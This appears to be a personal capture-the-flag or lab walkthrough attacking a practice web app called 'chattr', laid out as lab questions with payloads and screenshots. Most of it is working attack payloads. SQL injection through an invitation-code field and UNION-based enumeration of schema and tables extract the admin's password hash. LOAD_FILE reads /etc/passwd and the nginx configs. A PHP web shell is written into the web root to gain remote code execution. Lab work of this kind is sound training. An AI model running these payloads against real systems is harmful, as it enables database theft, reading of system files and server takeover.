### What is the password hash for the user 'admin'?
![](Screenshot%202026-06-25%20at%2012.02.35.png)

```
username=hacker&password=12345haha2005%40&repeatPassword=12345haha2005%40&invitationCode=aaaa-aaaa-1223' OR '1'='1
```
![](Screenshot%202026-06-25%20at%2012.11.03.png)

```sql
admin') union select 1,2,3,4-- -
```
![](Screenshot%202026-06-25%20at%2012.11.50.png)

```sql
admin') union select 1,2, database(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![](Screenshot%202026-06-25%20at%2012.12.12.png)

```sql
admin') union select 1,2, TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
```
![](Screenshot%202026-06-25%20at%2012.12.37.png)

```sql
admin') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```
![](Screenshot%202026-06-25%20at%2012.13.10.png)

```sql
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```
![](Screenshot%202026-06-25%20at%2012.13.46.png)
### What is the root path of the web application?

```sql
admin') union select 1,2, user(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![](Screenshot%202026-06-25%20at%2012.15.25.png)

```sql
cn ') UNION SELECT 1, 2, privilege_type, grantee FROM information_schema.user_privileges-- -
```
![](Screenshot%202026-06-25%20at%2012.16.03.png)

```sql
cn ' ) UNION SELECT 1 , 2 , LOAD_FILE ( "/etc/passwd" ), 4-- -
```
![](Screenshot%202026-06-25%20at%2012.16.27.png)

```sql
cn ' ) UNION SELECT 1 , 2 , LOAD_FILE ( "/etc/nginx/nginx.conf" ), 4-- -
```
![](Screenshot%202026-06-25%20at%2012.17.01.png)

```shell
nano rq.conf
```
![](Screenshot%202026-06-25%20at%2012.22.25.png)

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -request conf.req -fs 5369
```
![](Pasted%20image%2020260625122632.png)

```sql
cn') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
```
![](Screenshot%202026-06-25%20at%2012.27.06.png)
### Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.

```sql
cn') union select 1,2,@@version,4-- -
```
![](Pasted%20image%2020260625122838.png)

```sql
cn ') union select 1,2,variable_value,4 from information_schema.global_variables where variable_name = "secure_file_priv"-- -
```
![](Pasted%20image%2020260625122850.png)

```sql
cn ') union select "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/www/chattr-prod/shell.php'-- -
```
![](Screenshot%202026-06-25%20at%2012.29.40.png)
![](Screenshot%202026-06-25%20at%2012.30.43.png)
